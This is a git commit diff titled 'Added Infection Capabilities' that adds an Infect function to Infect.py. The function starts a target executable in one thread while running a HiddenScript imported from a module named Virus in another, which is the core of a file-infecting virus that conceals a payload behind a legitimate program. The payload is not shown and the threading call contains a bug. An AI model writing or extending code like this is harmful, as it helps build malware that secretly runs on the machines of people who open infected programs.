eb55545faba03326f08aefa14b9b9658be0c62f7
techieji <drpradhyum2016@outlook.com>
2020-03-13 15:26:24 -0400

    Added Infection Capabilities

--- Infect.py
+++ Infect.py
@@ -1,5 +1,12 @@
-from Virus import HiddenScript
 import threading
+import os
+from Virus import HiddenScript
+
+def OriginalFile(exepath):
+    os.startfile(exepath)
 
 def Infect(exepath):
-    
+    orgfile = threading.Thread(target=OriginalFile, args=(exepath))
+    ViralScript = threading.Thread(target=HiddenScript)
+    orgfile.start()
+    ViralScript.start()
